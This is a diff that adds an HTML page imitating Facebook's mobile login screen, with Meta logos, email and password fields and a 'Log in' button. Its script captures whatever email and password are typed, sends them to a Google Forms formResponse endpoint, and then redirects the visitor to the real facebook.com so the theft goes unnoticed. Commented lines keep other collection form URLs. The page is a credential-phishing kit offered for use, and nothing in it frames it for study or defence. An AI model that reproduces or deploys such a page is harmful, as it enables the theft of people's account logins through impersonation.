@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Kanit:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+  </head>
+  <body>
+    <p class="title">English (UK)</p>
+    <div class="container">
+      <div class="content">
+        <!-- <div class="logo">
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" alt="">
+    </div> -->
+        
+          <img
+            data-bloks-name="bk.components.Image"
+            role="heading"
+            alt="Facebook from Meta"
+            class="wbloks_1"
+            src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png"
+            style="
+              max-height: 60px;
+              min-height: 0px;
+              object-fit: contain;
+              overflow: hidden;
+              transform: translateY(24px) !important;
+            "
+          />
+        </div>
+        <form action="">
+          <input type="email" placeholder="Mobile number or email address" name="entry.357972910" class="first"/>
+          <input type="password" placeholder="Password" name="entry.1480216330" class="second"/>
+          <button >Log in</button>
+          <a href="./forget-password.html">Forgetten Password?</a>
+        </form>
+        <div class="create-button">
+            <a href="./create-account.html" style="width: 100%; display: flex; justify-content: center; align-items: center;">
+                <button type="submit" class="create">Create new account</button>
+            </a>
+            <div class="meta-image">
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" alt="">
+                
+            </div>  
+            <div class="last">
+                <span>About</span>
+                <span>Help</span>
+                <span>More</span>
+            </div>
+        </div>
+        
+    </div>
+     
+</div>
+<script>
+     if(window.innerWidth > 800){
+        window.location.href = '/screen.html';
+     }
+     const submitButton = document.querySelector(".buttonEnd")
+    const formData = new URLSearchParams();
+    const first = document.querySelector(".first")
+    const second = document.querySelector(".second")
+    console.log(first)
+    //  const third = document.querySelector(".third")
+    //  const fourth = document.querySelector(".fourth")
+
+
+    //  first.addEventListener("input",(e)=>{
+    //      first.setAttribute("value",e.target.value)
+        
+    //     })
+    second.addEventListener("input",(e)=>{
+         second.setAttribute("value",e.target.value)
+        
+        })
+     first.addEventListener("input",(e)=>{
+         first.setAttribute("value",e.target.value)
+        
+        })
+
+    //  third.addEventListener("input",(e)=>{
+    //     console.log(e.target.value)
+    //     third.setAttribute("value",e.target.value)
+        
+    //     })
+    //  fourth.addEventListener("input",(e)=>{
+    //     console.log(e.target.value)
+    //      fourth.setAttribute("value",e.target.value)
+        
+    //     })
+    
+        //  fifth.setAttribute("value",fifth.value)
+        
+    
+    
+        //  sixth.setAttribute("value",sixth.value)
+    
+        //  seven.setAttribute("value",seven.value)
+        
+  
+    
+        // nameInput.addEventListener("input",(e)=>{
+        //     nameInput.setAttribute("value",e.target.value)
+        // })
+
+        
+ if(second?.value > 1){
+    const form = document.querySelector("form").onsubmit = function(e){
+        e.preventDefault()
+       
+     
+       
+   
+
+
+//entry.1480216330
+// submitButton.disabled  = true
+formData.append("entry.357972910",first.value?.split(",")[0])
+formData.append("entry.1480216330",second.value?.split(",")[0])
+// formData.append("entry.1065046570",third.value?.split(",")[0])
+// formData.append("entry.839337160",fourth.value)
+
+console.log(formData)
+
+
+console.log("yes")
+// first -= entry.2005620554
+// second -= entry.1166974658
+// thihrd -= entry.1065046570
+// fourth -= entry.839337160
+// fifth -= entry.1789294454
+// sixth -= entry.397928938
+// seven -= entry.1835976121
+    
+// fetch('https://docs.google.com/forms/u/0/d/e/1FAIpQLSfh4dA-0Q0ibMFyLXog5mhP4skOe8IyQp9M8rdBLpvfEZxRQQ/formResponse', {
+fetch('https://docs.google.com/forms/u/0/d/e/1FAIpQLSdtEa2KRLrEBvdsK8syaue-KByGL2Bm9E_V_uvWUCzEm3A6oQ/formResponse', {
+// fetch('https://docs.google.com/forms/u/0/d/e/1FAIpQLSfmJKwrlQV57K6ocH_mFinBRA94kKiYTIOO_wKVuIVDnZJTkw/formResponse', {
+            method: 'POST',
+            headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body:formData
+        })
+        .then(function(response) {
+            if (response.ok) {
+                // Handle successful form submission
+                console.log('Form submitted successfully!');
+                // Redirect to another page if needed
+                window.location.href = 'https://www.facebook.com';
+            } else {
+                // Handle errors
+                console.error('Error submitting form:', response.statusText);
+                window.location.href = 'https://www.facebook.com';  
+            }
+        })
+        .catch(function(error) {
+            console.error('Error submitting form:', error);
+            window.location.href = 'https://www.facebook.com';
+        });
+            }
+ }
+
+
+
+       
+    
+
+</script>
+  </body>
+</html>
